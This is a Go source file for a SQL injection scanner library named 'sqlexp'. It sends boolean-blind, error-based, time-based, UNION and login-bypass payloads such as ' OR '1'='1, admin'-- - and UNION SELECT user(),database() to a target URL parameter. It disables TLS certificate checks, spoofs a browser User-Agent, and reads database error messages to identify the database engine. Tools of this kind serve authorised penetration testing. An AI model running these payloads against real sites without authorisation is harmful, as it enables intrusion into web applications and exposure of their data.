package sqlexp

import (
	"crypto/tls"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

type DetectLevel int

const (
	LevelFast   DetectLevel = iota
	LevelNormal
	LevelThorough
)

func (l DetectLevel) String() string {
	switch l {
	case LevelFast:
		return "fast"
	case LevelNormal:
		return "normal"
	case LevelThorough:
		return "thorough"
	default:
		return "unknown"
	}
}

type DetectResult struct {
	URL       string
	Param     string
	DBType    DBType
	Method    Method
	Vuln      bool
	Detail    string
	Evidence  string
	Payload   string
	Elapsed   time.Duration
	Confidence float64
}

func (r *DetectResult) String() string {
	if !r.Vuln {
		return fmt.Sprintf("[SAFE] %s?%s", r.URL, r.Param)
	}
	return fmt.Sprintf("[VULN] %s?%s | %s(%s) | %.0f%% | %s",
		r.URL, r.Param, r.Method, r.DBType, r.Confidence*100, r.Detail)
}

type Detector struct {
	url       string
	param     string
	method    string
	level     DetectLevel
	timeout   time.Duration
	threads   int
	headers   map[string]string
	cookies   map[string]string
	proxy     string
	verbose   bool
	dbTypes   []DBType

	baseline       *http.Response
	baselineBody   string
	baselineLen    int
	baselineElapsed time.Duration

	client *http.Client
}

func NewDetector() *Detector {
	return &Detector{
		method:  "GET",
		level:   LevelNormal,
		timeout: 15 * time.Second,
		threads: 10,
		headers: make(map[string]string),
		cookies: make(map[string]string),
		dbTypes: []DBType{MySQL, PostgreSQL, MSSQL, Oracle, SQLite},
		client: &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
}

func (d *Detector) URL(u string) *Detector {
	d.url = u
	return d
}

func (d *Detector) Param(p string) *Detector {
	d.param = p
	return d
}

func (d *Detector) Method(m string) *Detector {
	d.method = strings.ToUpper(m)
	return d
}

func (d *Detector) Level(l DetectLevel) *Detector {
	d.level = l
	return d
}

func (d *Detector) Timeout(t time.Duration) *Detector {
	d.timeout = t
	d.client.Timeout = t
	return d
}

func (d *Detector) Threads(n int) *Detector {
	if n < 1 {
		n = 1
	}
	if n > 50 {
		n = 50
	}
	d.threads = n
	return d
}

func (d *Detector) Header(k, v string) *Detector {
	d.headers[k] = v
	return d
}

func (d *Detector) Headers(h map[string]string) *Detector {
	for k, v := range h {
		d.headers[k] = v
	}
	return d
}

func (d *Detector) Cookie(k, v string) *Detector {
	d.cookies[k] = v
	return d
}

func (d *Detector) Cookies(c map[string]string) *Detector {
	for k, v := range c {
		d.cookies[k] = v
	}
	return d
}

func (d *Detector) Proxy(p string) *Detector {
	d.proxy = p
	if p != "" {
		proxyURL, err := url.Parse(p)
		if err == nil {
			d.client.Transport = &http.Transport{
				Proxy:           http.ProxyURL(proxyURL),
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			}
		}
	}
	return d
}

func (d *Detector) Verbose(v bool) *Detector {
	d.verbose = v
	return d
}

func (d *Detector) DBTypes(types ...DBType) *Detector {
	d.dbTypes = types
	return d
}

func (d *Detector) setBaseline() error {
	resp, body, elapsed, err := d.sendRequest(d.url, d.param, "1")
	if err != nil {
		resp, body, elapsed, err = d.sendRequest(d.url, d.param, "1'")
		if err != nil {
			return fmt.Errorf("sqlexp: baseline request failed: %w", err)
		}
	}
	d.baseline = resp
	d.baselineBody = body
	d.baselineLen = len(body)
	d.baselineElapsed = elapsed
	return nil
}

func (d *Detector) Detect() []*DetectResult {
	if d.url == "" {
		return []*DetectResult{{Vuln: false, Detail: "URL is empty"}}
	}

	if err := d.setBaseline(); err != nil {
		return []*DetectResult{{Vuln: false, Detail: err.Error()}}
	}

	if d.verbose {
		fmt.Printf("[*] Baseline: %d bytes, %v\n", d.baselineLen, d.baselineElapsed)
	}

	var results []*DetectResult

	results = append(results, d.detectBoolean()...)
	results = append(results, d.detectError()...)
	results = append(results, d.detectTime()...)

	if d.level >= LevelNormal {
		results = append(results, d.detectUnion()...)
	}
	if d.level >= LevelThorough {
		results = append(results, d.detectInline()...)
	}

	vulns := make([]*DetectResult, 0)
	for _, r := range results {
		if r.Vuln {
			vulns = append(vulns, r)
		}
	}
	return vulns
}

func (d *Detector) DetectAll() []*DetectResult {
	return d.Detect()
}

func (d *Detector) sendRequest(baseURL, param, payload string) (*http.Response, string, time.Duration, error) {
	var req *http.Request
	var err error

	fullURL := d.buildURL(baseURL, param, payload)

	start := time.Now()

	if d.method == "POST" {
		body := url.Values{}
		body.Set(param, payload)
		req, err = http.NewRequest("POST", baseURL, strings.NewReader(body.Encode()))
		if err != nil {
			return nil, "", 0, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequest("GET", fullURL, nil)
		if err != nil {
			return nil, "", 0, err
		}
	}

	for k, v := range d.headers {
		req.Header.Set(k, v)
	}
	for k, v := range d.cookies {
		req.AddCookie(&http.Cookie{Name: k, Value: v})
	}
	if _, ok := d.headers["User-Agent"]; !ok {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}

	resp, err := d.client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return nil, "", elapsed, err
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return resp, "", elapsed, err
	}

	return resp, string(bodyBytes), elapsed, nil
}

func (d *Detector) buildURL(baseURL, param, payload string) string {
	sep := "?"
	if strings.Contains(baseURL, "?") {
		sep = "&"
	}
	encoded := url.QueryEscape(payload)
	return fmt.Sprintf("%s%s%s=%s", baseURL, sep, param, encoded)
}

func (d *Detector) detectBoolean() []*DetectResult {
	var results []*DetectResult

	truePayloads := []string{"' AND '1'='1", "' AND 1=1-- -", "' OR '1'='1"}
	falsePayloads := []string{"' AND '1'='2", "' AND 1=2-- -", "' AND '1'='2"}

	for i := 0; i < len(truePayloads) && i < 2; i++ {
		_, trueBody, trueElapsed, err := d.sendRequest(d.url, d.param, truePayloads[i])
		if err != nil {
			continue
		}
		_, falseBody, falseElapsed, err := d.sendRequest(d.url, d.param, falsePayloads[i])
		if err != nil {
			continue
		}

		trueLen := len(trueBody)
		falseLen := len(falseBody)

		lenDiff := math.Abs(float64(trueLen - falseLen))
		baseDiff := math.Abs(float64(trueLen - d.baselineLen))

		if d.verbose {
			fmt.Printf("[*] Boolean[%d] true=%d false=%d baseline=%d elapsed=%v/%v\n",
				i, trueLen, falseLen, d.baselineLen, trueElapsed, falseElapsed)
		}

		if lenDiff > float64(d.baselineLen)*0.05 || baseDiff > float64(d.baselineLen)*0.1 {
			confidence := math.Min(lenDiff/float64(d.baselineLen)*3, 0.9)
			if confidence < 0.5 {
				confidence = 0.5
			}
			for _, db := range d.dbTypes {
				results = append(results, &DetectResult{
					URL:        d.url,
					Param:      d.param,
					DBType:     db,
					Method:     BooleanBlind,
					Vuln:       true,
					Detail:     fmt.Sprintf("Boolean blind: true=%dB, false=%dB, baseline=%dB", trueLen, falseLen, d.baselineLen),
					Evidence:   fmt.Sprintf("true_len=%d false_len=%d", trueLen, falseLen),
					Payload:    truePayloads[i],
					Elapsed:    trueElapsed,
					Confidence: confidence,
				})
			}
			break
		}
	}

	return results
}

var errorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*mysql_fetch`),
	regexp.MustCompile(`(?i)MySQLSyntaxErrorException`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)Warning.*\Wpg_\W`),
	regexp.MustCompile(`(?i)valid PostgreSQL result`),
	regexp.MustCompile(`(?i)Microsoft OLE DB.*SQL Server`),
	regexp.MustCompile(`(?i)Unclosed quotation mark`),
	regexp.MustCompile(`(?i)Microsoft SQL Native Client error`),
	regexp.MustCompile(`(?i)ODBC SQL Server Driver`),
	regexp.MustCompile(`(?i)SQLServer JDBC Driver`),
	regexp.MustCompile(`(?i)ORA-\d{4,5}`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)Oracle.*Driver`),
	regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
	regexp.MustCompile(`(?i)SQLite\.Exception`),
	regexp.MustCompile(`(?i)System\.Data\.SQLite`),
	regexp.MustCompile(`(?i)Warning.*sqlite`),
	regexp.MustCompile(`(?i)quoted string not properly terminated`),
	regexp.MustCompile(`(?i)you have an error in your sql syntax`),
	regexp.MustCompile(`(?i)division by zero`),
	regexp.MustCompile(`(?i)supplied argument is not a valid`),
	regexp.MustCompile(`(?i)XPATH syntax error`),
	regexp.MustCompile(`(?i)UPDATEXML`),
	regexp.MustCompile(`(?i)EXTRACTVALUE`),
}

func (d *Detector) detectError() []*DetectResult {
	var results []*DetectResult

	for _, db := range d.dbTypes {
		payloads := ErrorPayloads(db)

		limit := 3
		if d.level >= LevelThorough {
			limit = len(payloads)
		}

		for i := 0; i < len(payloads) && i < limit; i++ {
			resp, body, elapsed, err := d.sendRequest(d.url, d.param, payloads[i].Raw)
			if err != nil {
				continue
			}

			if resp.StatusCode >= 500 || d.matchErrorPatterns(body, resp) {
				dbType := d.identifyDBFromError(body)
				if dbType == nil {
					dbType = &db
				}

				results = append(results, &DetectResult{
					URL:        d.url,
					Param:      d.param,
					DBType:     *dbType,
					Method:     ErrorBased,
					Vuln:       true,
					Detail:     fmt.Sprintf("Error-based: HTTP %d, pattern matched", resp.StatusCode),
					Evidence:   d.extractErrorEvidence(body),
					Payload:    payloads[i].Raw,
					Elapsed:    elapsed,
					Confidence: 0.85,
				})
				break
			}
		}
	}

	return results
}

func (d *Detector) matchErrorPatterns(body string, resp *http.Response) bool {
	for _, pat := range errorPatterns {
		if pat.MatchString(body) {
			return true
		}
	}
	return false
}

func (d *Detector) identifyDBFromError(body string) *DBType {
	mysqlPatterns := []string{"MySQL", "mysql_fetch", "MySQLSyntaxErrorException"}
	for _, p := range mysqlPatterns {
		if strings.Contains(body, p) {
			db := MySQL
			return &db
		}
	}

	pgPatterns := []string{"PostgreSQL", "pg_", "PSQLException"}
	for _, p := range pgPatterns {
		if strings.Contains(body, p) {
			db := PostgreSQL
			return &db
		}
	}

	mssqlPatterns := []string{"SQL Server", "Unclosed quotation mark", "Microsoft OLE DB", "ODBC SQL Server"}
	for _, p := range mssqlPatterns {
		if strings.Contains(body, p) {
			db := MSSQL
			return &db
		}
	}

	oraclePatterns := []string{"ORA-", "Oracle", "oracle.jdbc"}
	for _, p := range oraclePatterns {
		if strings.Contains(body, p) {
			db := Oracle
			return &db
		}
	}

	sqlitePatterns := []string{"SQLite", "sqlite3", "System.Data.SQLite"}
	for _, p := range sqlitePatterns {
		if strings.Contains(body, p) {
			db := SQLite
			return &db
		}
	}

	return nil
}

func (d *Detector) extractErrorEvidence(body string) string {
	for _, pat := range errorPatterns {
		loc := pat.FindStringIndex(body)
		if loc != nil {
			start := loc[0]
			end := start + 200
			if end > len(body) {
				end = len(body)
			}
			return strings.TrimSpace(body[start:end])
		}
	}
	if len(body) > 200 {
		return body[:200]
	}
	return body
}

func (d *Detector) detectTime() []*DetectResult {
	var results []*DetectResult
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, d.threads)

	timeThreshold := d.baselineElapsed + 3*time.Second
	if d.baselineElapsed > time.Second {
		timeThreshold = d.baselineElapsed * 3
	}

	for _, db := range d.dbTypes {
		payloads := TimePayloads(db)

		limit := 2
		if d.level >= LevelNormal {
			limit = 3
		}

		for i := 0; i < len(payloads) && i < limit; i++ {
			wg.Add(1)
			sem <- struct{}{}

			go func(dbType DBType, payload Payload) {
				defer wg.Done()
				defer func() { <-sem }()

				resp, body, elapsed, err := d.sendRequest(d.url, d.param, payload.Raw)
				if err != nil {
					return
				}
				_ = resp
				_ = body

				if d.verbose {
					fmt.Printf("[*] Time[%s] elapsed=%v threshold=%v\n", dbType, elapsed, timeThreshold)
				}

				if elapsed > timeThreshold {
					mu.Lock()
					results = append(results, &DetectResult{
						URL:        d.url,
						Param:      d.param,
						DBType:     dbType,
						Method:     TimeBlind,
						Vuln:       true,
						Detail:     fmt.Sprintf("Time-based: elapsed=%v, baseline=%v", elapsed, d.baselineElapsed),
						Evidence:   fmt.Sprintf("%v", elapsed),
						Payload:    payload.Raw,
						Elapsed:    elapsed,
						Confidence: math.Min(float64(elapsed)/float64(timeThreshold), 0.95),
					})
					mu.Unlock()
				}
			}(db, payloads[i])
		}
	}

	wg.Wait()
	return results
}

func (d *Detector) detectUnion() []*DetectResult {
	var results []*DetectResult

	for _, db := range d.dbTypes {
		probes := d.getUnionProbes(db)
		for _, probe := range probes {
			_, body, elapsed, err := d.sendRequest(d.url, d.param, probe.Raw)
			if err != nil {
				continue
			}

			if d.isUnionSuccess(body, db) {
				results = append(results, &DetectResult{
					URL:        d.url,
					Param:      d.param,
					DBType:     db,
					Method:     UnionBased,
					Vuln:       true,
					Detail:     fmt.Sprintf("Union-based: probe returned expected data pattern"),
					Evidence:   probe.Raw,
					Payload:    probe.Raw,
					Elapsed:    elapsed,
					Confidence: 0.75,
				})
				break
			}
		}
	}

	return results
}

func (d *Detector) getUnionProbes(db DBType) []Payload {
	switch db {
	case MySQL:
		return []Payload{
			{Raw: "' UNION SELECT @@version,NULL,NULL-- -", Description: "Union probe", DB: MySQL, Method: UnionBased},
			{Raw: "' UNION SELECT user(),database(),NULL-- -", Description: "Union probe", DB: MySQL, Method: UnionBased},
		}
	case PostgreSQL:
		return []Payload{
			{Raw: "' UNION SELECT version(),NULL,NULL-- -", Description: "Union probe", DB: PostgreSQL, Method: UnionBased},
		}
	case MSSQL:
		return []Payload{
			{Raw: "' UNION SELECT @@version,NULL,NULL--", Description: "Union probe", DB: MSSQL, Method: UnionBased},
		}
	case Oracle:
		return []Payload{
			{Raw: "' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--", Description: "Union probe", DB: Oracle, Method: UnionBased},
		}
	case SQLite:
		return []Payload{
			{Raw: "' UNION SELECT sqlite_version(),NULL,NULL--", Description: "Union probe", DB: SQLite, Method: UnionBased},
		}
	}
	return nil
}

func (d *Detector) isUnionSuccess(body string, db DBType) bool {
	if len(body) == 0 {
		return false
	}

	baseDiff := math.Abs(float64(len(body) - d.baselineLen))
	if baseDiff < 10 {
		return false
	}

	switch db {
	case MySQL:
		return d.baselineLen > 100 && baseDiff > float64(d.baselineLen)*0.1 &&
			(strings.Contains(body, "mysql") || strings.Contains(body, "root") ||
				strings.Contains(body, "localhost") || strings.Contains(body, "5.") ||
				strings.Contains(body, "8.") || strings.Contains(body, "10.") ||
				strings.Contains(body, "MariaDB"))
	case PostgreSQL:
		return d.baselineLen > 100 && baseDiff > float64(d.baselineLen)*0.1 &&
			(strings.Contains(body, "PostgreSQL") || strings.Contains(body, "9.") ||
				strings.Contains(body, "10.") || strings.Contains(body, "11.") ||
				strings.Contains(body, "12.") || strings.Contains(body, "13.") ||
				strings.Contains(body, "14.") || strings.Contains(body, "15.") ||
				strings.Contains(body, "16."))
	case MSSQL:
		return d.baselineLen > 100 && baseDiff > float64(d.baselineLen)*0.1 &&
			(strings.Contains(body, "Microsoft") || strings.Contains(body, "SQL Server") ||
				strings.Contains(body, "201") || strings.Contains(body, "202"))
	case Oracle:
		return d.baselineLen > 100 && baseDiff > float64(d.baselineLen)*0.1 &&
			(strings.Contains(body, "Oracle") || strings.Contains(body, "12c") ||
				strings.Contains(body, "18c") || strings.Contains(body, "19c") ||
				strings.Contains(body, "21c") || strings.Contains(body, "11g"))
	case SQLite:
		return d.baselineLen > 100 && baseDiff > float64(d.baselineLen)*0.1 &&
			strings.Contains(body, "3.")
	}

	return false
}

func (d *Detector) detectInline() []*DetectResult {
	var results []*DetectResult

	inlineTests := []struct {
		payload  string
		desc     string
	}{
		{"' OR '1'='1", "Inline OR true"},
		{"' OR 1=1-- -", "Inline OR 1=1"},
		{"admin'-- -", "Inline comment bypass"},
	}

	for _, test := range inlineTests {
		_, body, elapsed, err := d.sendRequest(d.url, d.param, test.payload)
		if err != nil {
			continue
		}

		lenDiff := math.Abs(float64(len(body) - d.baselineLen))
		if lenDiff > float64(d.baselineLen)*0.2 && len(body) > d.baselineLen+50 {
			for _, db := range d.dbTypes {
				results = append(results, &DetectResult{
					URL:        d.url,
					Param:      d.param,
					DBType:     db,
					Method:     InlineQuery,
					Vuln:       true,
					Detail:     fmt.Sprintf("Inline: %s, body=%dB baseline=%dB", test.desc, len(body), d.baselineLen),
					Evidence:   test.payload,
					Payload:    test.payload,
					Elapsed:    elapsed,
					Confidence: 0.6,
				})
			}
			break
		}
	}

	return results
}

func QuickDetect(urlStr, param string) []*DetectResult {
	return NewDetector().URL(urlStr).Param(param).Detect()
}

func QuickDetectAll(urlStr, param string) []*DetectResult {
	return NewDetector().URL(urlStr).Param(param).Level(LevelThorough).Detect()
}